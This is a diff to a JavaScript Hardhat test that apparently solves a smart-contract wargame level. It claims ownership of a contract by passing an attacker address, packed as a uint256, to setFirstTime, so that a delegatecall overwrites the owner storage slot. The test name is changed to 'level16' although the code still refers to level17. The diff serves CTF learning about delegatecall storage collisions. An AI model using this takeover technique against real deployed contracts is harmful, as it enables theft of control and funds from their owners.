@@ -25,18 +25,19 @@ describe("Fallback", function () {
     The goal of this level is for you to claim ownership of the instance you are given.
     */
     describe("Solve", function() {
-        it("Should solve level17", async function() {
+        it("Should solve level16", async function() {
             const {level17, level17Helper, owner, otherAccount} = await loadFixture(deployFallback);
             // Get the address of otherAccount and pad it out with nulls so we can send it as a
             // uint256
             let contractOwner = await level17.connect(otherAccount).owner();
-            expect (contractOwner == owner.address);
-            const address = ethers.utils.hexlify(otherAccount.address).concat("000000000000000000000000");
+            expect (contractOwner).equals(owner.address);
+            // Pack the address as a uint256
+            const address = "0x000000000000000000000000".concat(ethers.utils.hexlify(otherAccount.address).slice(2,))
             // This will delegatecall into our helper contract, which will convert the uin256 into
             // an address and set the owner
             await level17.connect(otherAccount).setFirstTime(address);
             contractOwner = await level17.connect(otherAccount).owner();
-            expect (contractOwner == otherAccount.address)
+            expect (contractOwner).equals(otherAccount.address)
         })
     });
 });
